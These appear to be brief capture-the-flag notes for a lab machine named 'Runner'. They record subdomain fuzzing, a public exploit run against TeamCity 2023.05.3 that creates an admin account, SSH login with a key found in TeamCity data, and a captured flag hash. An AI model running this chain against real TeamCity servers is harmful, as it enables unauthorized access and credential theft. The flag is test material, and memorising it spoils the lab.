rustscan -r 1-65535 -a 10.10.11.13 -- -sV -Pn -A

![[Runner image.png]]

![[Runner image 1.png]]

ffuf -c -ac -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.runner.htb' -u http://runner.htb

![[Runner image 2.png]]

ffuf -c -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u "http://runner.htb" -H "Host:FUZZ.runner.htb" -fc 302

![[Runner image 3.png]]

teamcity

echo "10.10.11.13 teamcity.runner.htb"|sudo tee -a  /etc/hosts

10.10.11.13 teamcity.runner.htb

gobuster vhost -u http://runner.htb/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --append-domain -r

![[Runner image 4.png]]

Version 2023.05.3 (build 129390)

https://www.exploit-db.com/exploits/51884

python3 51884.py -u http://teamcity.runner.htb

![[Runner image 5.png]]

Username: city_admin08TP

Password: Main_password!!**

![[Runner image 6.png]]

Success

Users

![[Runner image 7.png]]

![[Runner image 8.png]]

ssh -i config/projects/AllProjects/pluginData/ssh_keys/id_rsa john@runner.htb

![[Runner image 9.png]]

![[Runner image 10.png]]

4ee333c7035125573f3586d970d3dbfb

roo.txt

![[Runner image 11.png]]